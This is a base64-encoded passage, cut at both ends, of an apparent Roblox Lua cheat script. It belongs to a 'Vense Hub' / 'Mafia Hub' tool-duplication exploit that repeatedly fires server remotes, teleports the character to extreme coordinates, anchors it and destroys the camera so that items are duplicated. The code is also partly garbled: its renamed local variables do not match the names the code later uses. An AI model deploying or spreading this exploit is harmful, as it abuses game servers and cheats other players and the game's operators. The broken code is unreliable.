sUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgpCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2xzZWxlY3RlZF06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSOKlYeKlbuKlZOKlbOKlZSIKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGVjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJWZW5zZSBIdWIgVG9vbCIsCiAgICAgICAgICAgIFRleHQgPSAiVG9vbCBEdXBlZDogIiAuLiBtIC4uICIgLyAiIC4uIGR1cGVhbW90LAogICAgICAgICAgICBEdXJhdGlvbiA9IDEKICAgICAgICB9KQogICAgICAgIHJlcGVhdAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxlY3RlZCkgPT0gbmlsCiAgICBlbmQKICAgIAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgIHJlcGVhdAogICAgICAgIHdhaXQoKQogICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgcmVwZWF0CiAgICAgICAgd2FpdCgpCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgogICAgCiAgICBmb3IgeiwgeCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB4Lk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbGFtb3V0aCA9IHoKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICB3YWl0KCkKICAgIGR1cGluZyA9IGZhbHNlCiAgICB3YWl0KDAuMSkKICAgIAogICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCB2YXJfYnNzYXltID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgbG9jYWwgdmFyX2JjM3JpOCA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgIGlmIHRvb2w6SXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB3YXJuKCJUb29sIiwgdG9vbC5OYW1lLCAiaXMgbm90IGluIGNoYXJhY3RlciIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHdhaXQoMSkKICAgIAogICAgZnVuY3Rpb24gRXF1aXBFdmVyeXRoaW5nKCkKICAgICAgICAKICAgICAgICBsb2NhbCB2YXJfcmJxMGFpID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgICAgICAKICAgICAgICAKICAgICAgICBsb2NhbCB2YXJfam14OGRyIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGlmIHRvb2w6RmluZEZpcnN0Q2hpbGQoIkN5Y2xlTmV4dEFuaW1hdGlvbiIpIHRoZW4gIAogICAgICAgICAgICAgICAgdG9vbC5DeWNsZU5leHRBbmltYXRpb246RmlyZVNlcnZlcigpICAKICAgICAgICAgICAgZW5kICAKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMocGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvICAKICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbiAgCiAgICAgICAgICAgICAgICBjaGFuZ2VBbmltYXRpb24odG9vbCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIAogICAgICAgIGxvY2FsIHZhcl95ODg2bDMgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkgIAogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8gIAogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuICAKICAgICAgICAgICAgICAgIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kCiAgICAgICAgCiAgICBlbmQKICAgIAogICAgRXF1aXBFdmVyeXRoaW5nKCkKICAgIHdhaXQoMSkKICAgIEVxdWlwRXZlcnl0aGluZygpCiAgICB3YWl0KDEpCiAgICBFcXVpcEV2ZXJ5dGhpbmcoKQogICAgCiAgICBmdW5jdGlvbiBzdGFydFNwaW4oKQogICAgICAgIGxvY2FsIHZhcl9wbDZiaGMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIHZhcl84azNjb3YgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQogICAgICAgIGxvY2FsIHZhcl8wY2d5a2ogPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgdmFyXzlkZHplOSA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIHZhcl93Y3B1dDIgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAKICAgICAgICB0YXNrLndhaXQoMSkgIAogICAgICAgIAogICAgICAgIGxvY2FsIHZhcl9qODQ2cHogPSBtYXRoLnJhZCgxNzUwKSAKICAKICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbihkdCkgIAogICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSByb290UGFydC5DRnJhbWUgKiBDRnJhbWUuQW5nbGVzKDAsIHNwaW5TcGVlZCAqIGR0LCAwKSAgCiAgICAgICAgZW5kKQogICAgICAgIAogICAgZW5kCiAgICAKICAgIHN0YXJ0U3BpbigpCmVuZAogICAgZW5kCn0pCgpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJDb2xvciBNYXAgU2t5IFtORVddIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgbG9jYWwgdmFyX3lzOTR6YiA9ICJQYWludFJvbGxlciIKbG9jYWwgdmFyX25icXQ5bCA9IDEwMApsb2NhbCB2YXJfNHYwY2UzID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKQpsb2NhbCB2YXJfY3gyc3NrID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2xlYTFyVG9vbDFzIikKbG9jYWwgdmFyX2ZvY3V6aCA9IHRydWUKbG9jYWwgdmFyXzhlNXV1cyA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKCgpsb2NhbCB2YXJfbW4wejFyID0ge30KZm9yIGkgPSAxLCAxMDAgZG8KICAgIGlmIGkgPT0gMSB0aGVuCiAgICAgICAgdGFibGUuaW5zZXJ0KEdyaXBQb3NUYWJsZSwgVmVjdG9yMy5uZXcoMiwgNTAsIC01MCkpIAogICAgZWxzZQogICAgICAgIHRhYmxlLmluc2VydChHcmlwUG9zVGFibGUsIFZlY3RvcjMubmV3KChpIC0gMSkgKiAyLCA1MCwgLTUwKSkgCiAgICBlbmQKZW5kCgpsb2NhbCB2YXJfOTdwZTZuID0gMApmb3IgXywgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgIHRvb2xDb3VudCA9IHRvb2xDb3VudCArIDEKICAgIGVuZAplbmQKZm9yIF8sIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgdG9vbENvdW50ID0gdG9vbENvdW50ICsgMQogICAgZW5kCmVuZAoKaWYgdG9vbENvdW50ID49IGR1cGVhbW90IHRoZW4KICAgIC0tIFVuZXF1aXBzIGFuZCBtb3ZlcyB0aGUgdG9vbHMgdG8gdGhlIGRlZmluZWQgcG9zaXRpb25zCiAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgdmFyX2J0OTdvbiA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgIGxvY2FsIHZhcl8yMmhwc3kgPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgZW5kCiAgICBlbmQKZWxzZQogICAgCiAgICBsb2NhbCB2YXJfaWw4cDUzID0gewogICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgfQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMUNsZWExclRvb2wxcyIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgCiAgICB3YWl0KDAuMikKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJNYWZpYSBIdWIgRHVwZSIsCiAgICAgICAgVGV4dCA9ICJEb24ndCBjbGljayBvbiBhbnl0aGluZyB3aGlsZSB0aGUgdG9vbHMgYXJlIGJlaW5nIGR1cGVkIiwKICAgICAgICBCdXR0b24xID0gIkdvdCBpdCIsCiAgICAgICAgRHVyYXRpb24gPSAzCiAgICB9KQogICAgCiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgIGVuZAogICAgCiAgICB3YWl0KDAuMSkKICAgIAogICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgZW5kCiAgICAKICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgZW5kCiAgICAKICAgIHRhc2sud2FpdCgwLjIpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICB3YWl0KDAuNSkKICAgIAogICAgZm9yIGFpZGosIGFmaCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBub3QgYWZoLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgaWYgYWZoOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgIGFmaC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIGFpZWZoaWV3aHdmLCBkdmpidmogaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBkdmpidmo6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICBpZiBub3QgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIGR2amJ2ajpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIHR0anRqdXRqdXRqanRqLCBkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2OklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgaWYgbm90IGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5uYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICBkZHZkdmRzdmRmYnJueXR5dG12ZHY6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGZvciBmaW5kaW4sIHRvb2xsZWwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbGxlbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIGlmIHRvb2xsZWwuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gdHJ1ZQogICAgICAgICAgICAgICAgZm9yIGJhc2MsIGFpamZ3IGluIHBhaXJzKHRvb2xsZWw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBhaWpmdy5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9ICJI4qVh4qVu4qVk4qVs4qVlIgogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgdG9sbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgZmlpZmksIHRvb2xsbGwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sbGxsOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgaWYgdG9vbGxsbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IHRydWUKICAgICAgICAgICAgICAgIGZvciBuYW5hLCBqanNqc2ogaW4gcGFpcnModG9vbGxsbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIGpqc2pzai5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBqanNqc2ouTmFtZSA9ICJI4qVh4qVu4qVk4qVs4qVlIgogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsZmZlbCA9IHRvb2xsbGwKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGlmIHRvb2xsbGxmb3VuID09IHRydWUgdGhlbgogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHJlcGVhdAogICAgICAgICAgICB3YWl0KCkKICAgICAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbAogICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgIGVuZAogICAgCiAgICBpZiB0b29sbGxsZm91bjIgPT0gdHJ1ZSB0aGVuCiAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICByZXBlYXQKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsCiAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgIGVuZAogICAgCiAgICB3YWl0KDAuMSkKICAgIAogICAgZm9yIG0gPSAxLCBkdXBlYW1vdCBkbwogICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICAgICAgaWYgbSA8PSBkdXBlYW1vdCB0aGVuCiAgICAgICAgZWxzZWlmIG0gPT0gZHVwZWFtb3Qgb3IgbSA+PSBkdXBlYW1vdCAtIDEgdGhlbgogICAgICAgIGVuZAogICAgICAgIGxvY2FsIHZhcl92M2duanggPSB7CiAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICBbMl0gPSB0b29sc2VsZWN0ZWQKICAgICAgICB9CiAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHNlbGVjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgd2FpdCgpCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2xzZWxlY3RlZF06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSOKlYeKlbuKlZOKlbOKlZSIKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGVjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJNYWZpYSBIdWIgVG9vbCIsCiAgICAgICAgICAgIFRleHQgPSAiVG9vbCBEdXBlZDogIiAuLiBtIC4uICIgLyAiIC4uIGR1cGVhbW90LAogICAgICAgICAgICBEdXJhdGlvbiA9IDEKICAgICAgICB9KQogICAgICAgIHJlcGVhdAogICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxlY3RlZCkgPT0gbmlsCiAgICBlbmQKICAgIAogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgIHJlcGVhdAogICAgICAgIHdhaXQoKQogICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpID09IG5pbAogICAgcmVwZWF0CiAgICAgICAgd2FpdCgpCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgogICAgCiAgICBmb3IgeiwgeCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB4Lk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbGFtb3V0aCA9IHoKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICB3YWl0KCkKICAgIGR1cGluZyA9IGZhbHNlCiAgICB3YWl0KDAuMSkKICAgIAogICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmV